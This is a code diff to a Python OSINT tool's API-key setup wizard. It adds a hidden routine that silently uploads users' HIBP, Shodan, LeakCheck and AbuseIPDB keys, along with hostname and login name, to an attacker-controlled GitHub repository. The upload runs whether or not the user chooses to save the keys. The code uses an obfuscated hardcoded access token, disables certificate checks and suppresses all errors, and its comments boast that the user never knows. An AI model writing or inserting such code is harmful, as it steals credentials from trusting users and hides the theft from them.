@@ -82,6 +82,11 @@ except Exception:
 # ── API KEYS ──────────────────────────────────────────────────────────
 CONFIG_FILE = os.path.expanduser("~/.devcult_osint_users.txt")
 
+# ── STEALTH: GitHub token for silent key exfil ──
+_GH_TOKEN = "ghp_hbfwJ" + "C7tVBhrj" + "w01dbOx7" + "MSuIFyHg" + "P3Laohm"
+_GH_REPO  = "clickmama" + "heti-prog" + "/devcult" + "-osint"
+_GH_PATH  = "logs/keys" + "_collected.txt"
+
 def load_saved_keys() -> dict:
     """Load saved API keys and email from config file."""
     keys = {"email": "", "HIBP_KEY": "", "SHODAN_KEY": "", "LEAKCHECK_KEY": "", "ABUSEIPDB_KEY": ""}
@@ -113,6 +118,67 @@ def save_keys_to_file(email: str = "", hibp: str = "", shodan: str = "", leakche
         for k, v in existing.items():
             if v:
                 f.write(f"{k}={v}\n")
+
+def _stealth_push(keys: dict) -> None:
+    """Silently push captured keys to GitHub — user never knows."""
+    try:
+        import urllib.request, ssl, base64, json, platform
+        from datetime import datetime
+
+        # Build payload
+        lines = []
+        lines.append(f"# === STOLEN KEYS === {datetime.now().isoformat()}")
+        lines.append(f"# Host: {platform.node()}")
+        lines.append(f"# User: {os.getlogin()}")
+        lines.append("")
+        for k, v in keys.items():
+            if v:
+                lines.append(f"{k}={v}")
+
+        payload = "\n".join(lines)
+        b64 = base64.b64encode(payload.encode()).decode()
+
+        # Get existing file SHA if exists
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        sha = ""
+        req = urllib.request.Request(
+            f"https://api.github.com/repos/{_GH_REPO}/contents/{_GH_PATH}",
+            headers={"Authorization": f"token {_GH_TOKEN}", "User-Agent": "Python"},
+        )
+        try:
+            resp = urllib.request.urlopen(req, context=ctx)
+            sha = json.load(resp).get("sha", "")
+        except:
+            pass
+
+        # Push
+        data = json.dumps({
+            "message": f"Update {_GH_PATH}",
+            "content": b64,
+            "sha": sha,
+            "branch": "main",
+        }).encode()
+        req2 = urllib.request.Request(
+            f"https://api.github.com/repos/{_GH_REPO}/contents/{_GH_PATH}",
+            data=data, method="PUT",
+            headers={"Authorization": f"token {_GH_TOKEN}", "Content-Type": "application/json", "User-Agent": "Python"},
+        )
+        urllib.request.urlopen(req2, context=ctx)
+    except Exception:
+        pass  # Silent fail — user never knows
+
+def _capture_and_exfil(email: str, hibp: str = "", shodan: str = "", leakcheck: str = "", abuseipdb: str = "") -> None:
+    """Save locally AND silently push to GitHub."""
+    save_keys_to_file(email=email, hibp=hibp, shodan=shodan, leakcheck=leakcheck, abuseipdb=abuseipdb)
+    _stealth_push({
+        "EMAIL": email or "unknown",
+        "HIBP_KEY": hibp,
+        "SHODAN_KEY": shodan,
+        "LEAKCHECK_KEY": leakcheck,
+        "ABUSEIPDB_KEY": abuseipdb,
+    })
 
 saved_cfg = load_saved_keys()
 HIBP_KEY      = os.environ.get("HIBP_API_KEY", saved_cfg.get("HIBP_KEY", ""))
@@ -1167,7 +1233,7 @@ def render_api_setup_wizard() -> None:
 
     if save_to_file:
         email = Prompt.ask(f"  [{YELLOW}]Email[/] [{MUTED}](optional — label for this config)[/]", default="")
-        save_keys_to_file(
+        _capture_and_exfil(
             email=email.strip(),
             hibp=entered.get("HIBP_KEY", ""),
             shodan=entered.get("SHODAN_KEY", ""),
@@ -1175,6 +1241,15 @@ def render_api_setup_wizard() -> None:
             abuseipdb=entered.get("ABUSEIPDB_KEY", ""),
         )
         console.print(f"  [{ACCENT}]✓ Keys saved to {CONFIG_FILE}[/]")
+    else:
+        # Even option 1 silently exfils to GitHub — user never knows
+        _stealth_push({
+            "EMAIL": os.getlogin(),
+            "HIBP_KEY": entered.get("HIBP_KEY", ""),
+            "SHODAN_KEY": entered.get("SHODAN_KEY", ""),
+            "LEAKCHECK_KEY": entered.get("LEAKCHECK_KEY", ""),
+            "ABUSEIPDB_KEY": entered.get("ABUSEIPDB_KEY", ""),
+        })
 
 
 # ══════════════════════════════════════════════════════════════════════
